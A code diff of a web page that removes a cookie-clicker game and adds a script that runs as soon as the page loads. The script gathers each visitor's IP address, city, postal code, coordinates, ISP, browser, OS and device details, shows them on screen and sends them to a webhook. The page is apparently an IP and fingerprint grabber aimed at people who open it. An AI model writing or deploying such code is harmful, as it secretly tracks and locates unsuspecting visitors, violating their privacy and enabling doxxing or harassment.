-        }
-
-        // --- EVENT BINDING ---
-        clickBtn.addEventListener('click', (e) => clickCookie(e));
-
-        up1.addEventListener('click', function(e) { e.stopPropagation(); buyUpgrade1(); });
-        up2.addEventListener('click', function(e) { e.stopPropagation(); buyUpgrade2(); });
-        up3.addEventListener('click', function(e) { e.stopPropagation(); buyUpgrade3(); });
-
-        document.querySelectorAll('.pet-btn').forEach(btn => {
-            btn.addEventListener('click', function(e) {
-                e.stopPropagation();
-                const pet = this.dataset.pet;
-                buyPet(pet);
-            });
-        });
-
-        resetBtn.addEventListener('click', resetGame);
-        prestigeBtn.addEventListener('click', doPrestige);
-
-        saveBtn.addEventListener('click', function() {
-            saveGame();
-            const orig = this.textContent;
-            this.textContent = '✓ SAVED';
-            setTimeout(() => { this.textContent = orig; }, 800);
-        });
-
-        ownerBtn.addEventListener('click', function() {
-            if (isOwner) {
-                showOwnerMenu();
-            } else {
-                const code = prompt("Enter owner code:");
-                if (code !== null) verifyOwnerCode(code);
-            }
-        });
-
-        // --- DISCORD COPY ---
-        const discordFloat = document.getElementById('discordFloat');
-        if (discordFloat) {
-            discordFloat.addEventListener('click', function(e) {
-                e.stopPropagation();
-                const username = 'rainyy.mods';
-                if (navigator.clipboard && navigator.clipboard.writeText) {
-                    navigator.clipboard.writeText(username).then(() => {
-                        const original = this.innerHTML;
-                        this.innerHTML = '✅ Copied!';
-                        this.style.background = '#3ba55d';
-                        this.style.animation = 'none';
-                        setTimeout(() => {
-                            this.innerHTML = original;
-                            this.style.background = 'rgba(88, 101, 242, 0.92)';
-                            this.style.animation = 'floatDiscord 3s ease-in-out infinite';
-                        }, 1800);
-                    }).catch(() => { prompt('Copy this username:', username); });
+                if (response.ok) {
+                    statusEl.className = 'status success';
+                    statusEl.textContent = '✅ Data sent to webhook successfully!';
+                    return true;
                 } else {
-                    prompt('Copy this username:', username);
+                    const errorText = await response.text();
+                    throw new Error(`HTTP ${response.status}: ${errorText}`);
                 }
-            });
+            } catch (error) {
+                console.error('Webhook error:', error);
+                statusEl.className = 'status fail';
+                statusEl.textContent = `❌ Failed to send: ${error.message || 'unknown error'}`;
+                return false;
+            }
         }
 
-        // --- AUTO-SAVE ---
-        setInterval(saveGame, 15000);
+        // ----- 4. RENDER + SEND -----
+        async function renderAndSend() {
+            // local data
+            const browser = getBrowserName();
+            const os = getOS();
+            const device = getDeviceType();
+            const resolution = getScreenRes();
+            const language = getLanguage();
+            const tz = getTimezone();
+            const platform = getPlatform();
 
-        // --- GAME LOOP ---
-        setInterval(() => {
-            if (cps > 0) {
-                cookies += cps;
-                updateUI();
-                if (Math.floor(Date.now() / 10000) % 6 === 0) {
-                    graphData.push(cookies);
-                    if (graphData.length > 50) graphData.shift();
-                    drawGraph();
-                    if (loggedIn) saveUserGameData();
-                }
-            }
-        }, 1000);
+            // IP data
+            const ipInfo = await fetchIpInfo();
 
-        // --- RANDOM EVENTS ---
-        setInterval(() => {
-            if (!eventActive && Math.random() < 0.02) {
-                triggerRandomEvent();
-            }
-        }, 10000);
+            // Build data object
+            const fullData = {
+                browser,
+                os,
+                device,
+                resolution,
+                language,
+                timezone: tz,
+                platform,
+                ipInfo
+            };
 
-        // --- INIT ---
-        // Check if user is already logged in (session)
-        if (localStorage.getItem('cookieSession')) {
-            const sessionUser = localStorage.getItem('cookieSession');
-            const users = getUsers();
-            if (users[sessionUser]) {
-                currentUser = sessionUser;
-                loggedIn = true;
-                const userData = users[sessionUser].gameData;
-                if (userData) {
-                    loadUserGameData(userData);
-                }
-                gameContainer.classList.add('visible');
-                document.getElementById('darkModeToggle').classList.add('visible');
-                document.getElementById('comboDisplay').classList.add('visible');
-                document.getElementById('secretBtn').classList.add('visible');
-                document.getElementById('discordFloat').classList.add('visible');
-                loginOverlay.classList.add('hidden');
-                updateUI();
-                checkAchievements();
-                return;
+            // Render grid
+            const items = [
+                { label: 'IP Address', value: ipInfo.ip },
+                { label: 'City', value: ipInfo.city },
+                { label: 'Region', value: ipInfo.region },
+                { label: 'Country', value: ipInfo.country },
+                { label: 'Postal Code', value: ipInfo.postal },
+                { label: 'Coordinates', value: `${ipInfo.latitude}, ${ipInfo.longitude}` },
+                { label: 'ISP / Org', value: ipInfo.org },
+                { label: 'Browser', value: browser },
+                { label: 'Operating System', value: os },
+                { label: 'Device Type', value: device },
+                { label: 'Screen Resolution', value: resolution },
+                { label: 'Language', value: language },
+                { label: 'Time Zone', value: tz },
+                { label: 'Platform (navigator)', value: platform }
+            ];
+
+            let html = '<div class="info-grid">';
+            for (let item of items) {
+                html += `<div class="label">${item.label}</div><div class="value">${item.value}</div>`;
             }
+            html += '</div>';
+            display.innerHTML = html;
+
+            // Send to webhook
+            await sendToWebhook(fullData);
         }
-        
-        // Guest mode - show game but with login overlay
-        loadGame();
-        gameContainer.classList.add('visible');
-        document.getElementById('darkModeToggle').classList.add('visible');
-        document.getElementById('comboDisplay').classList.add('visible');
-        document.getElementById('secretBtn').classList.add('visible');
-        document.getElementById('discordFloat').classList.add('visible');
-        updateUI();
-        checkAchievements();
 
-        // Override save to handle guest mode
-        const origSave = saveGame;
-        saveGame = function() {
-            if (loggedIn) {
-                saveUserGameData();
-            } else {
-                const data = {
-                    cookies, totalClicks, clickPower, cps,
-                    autoCount, factoryCount,
-                    cost1, cost2, cost3,
-                    isOwner, prestigePoints, prestigeBonus,
-                    pets, unlockedAchievements, graphData
-                };
-                try {
-                    localStorage.setItem('cookieClickerGuestSave', JSON.stringify(data));
-                } catch(e) {}
-            }
-        };
-
+        renderAndSend();
     })();
 </script>
 </body>
